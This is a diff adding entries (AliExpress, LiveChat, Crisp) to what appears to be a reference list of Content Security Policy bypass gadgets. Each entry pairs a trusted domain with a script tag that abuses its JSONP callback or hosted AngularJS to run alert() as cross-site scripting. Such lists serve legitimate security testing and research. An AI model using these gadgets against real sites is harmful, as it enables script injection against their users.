@@ -1,6 +1,7 @@
 Domain	Code
 7b936.v.fwmrm.net	<script src="https://7b936.v.fwmrm.net/ad/g/1?nw=1&csid=1&resp=json&cbfn=alert(1)-"></script> 
 a.huodong.mi.com	<script src="https://a.huodong.mi.com/postfree/postfree?callback=alert"></script>
+acs.aliexpress.com	<script src="https://acs.aliexpress.com/h5/mtop.aliexpress.address.shipto.division.get/1.0/?type=jsonp&dataType=jsonp&callback=alert"></script>
 aax-eu.amazon.com	<script src="https://aax-eu.amazon.com/e/xsp/getAdj?callback=alert(1)-"></script>
 accdn.lpsnmedia.net	<script src="https://accdn.lpsnmedia.net/api/account/1/configuration/engagement-window/window-confs/1?cb=alert"></script>
 accounts.google.com	<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
@@ -34,6 +35,7 @@ api.stackexchange.com	<script src="https://api.stackexchange.com/2.2/me?callback
 api.swiftype.com	<script src="https://api.swiftype.com/api/v1/public/engines/search.json?callback=alert&engine_key=JDuYRnCLSDZzYWgBkoSB"></script>
 api.twitter.com	<script src="https://api.twitter.com/1/statuses/oembed.json?url=https:%2F%2Ftwitter.com%2FMartina%2Fstatus%2F867710263654580226&callback=alert&_=1496363308445"></script>
 api.tumblr.com	<script src="https://api.tumblr.com/v2/blog/zoeappleseed.tumblr.com/posts/photo?tag=seed&offset=0&api_key=msIByDvkVk3gSr360nq2vmTkKIAvW4gNTB2dUYkvIO9NLwyxNy&jsonp=alert"></script>
+api.livechatinc.com	<script src="https://api.livechatinc.com/v3.6/customer/action/get_dynamic_configuration?license_id=x&url=x&channel_type=code&jsonp=alert"></script>
 api.vk.com	<script src="https://api.vk.com/method/wall.get?callback=alert(1337)"></script>
 api.wordpress.org	<script src="https://api.wordpress.org/stats/plugin/1.0/?slug=x&callback=alert"></script>
 api.x.com	<script src="https://api.x.com/1/statuses/oembed.json?url=https:%2F%2Ftwitter.com%2FMartina%2Fstatus%2F867710263654580226&callback=alert&_=1496363308445"></script>
@@ -56,6 +58,7 @@ cdnjs.cloudflare.com	<script src="https://cdnjs.cloudflare.com/ajax/libs/alpinej
 cdnjs.cloudflare.com	<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 challenges.cloudflare.com	<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=alert"></script>
 client-api.arkoselabs.com	<script src="https://client-api.arkoselabs.com/fc/a/?callback=alert"></script>
+client.crisp.chat	<script src="https://client.crisp.chat/settings/website/x/?callback=-alert(1);/*"></script>
 code.angularjs.org	<script src="https://code.angularjs.org/1.8.2/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 commerce.coinbase.com	<script src="https://commerce.coinbase.com/v1/checkout.js?onload=alert"></script>
 common.like.naver.com	<script src="https://common.like.naver.com/v1/search/contents?callback=alert&q=x"></script>
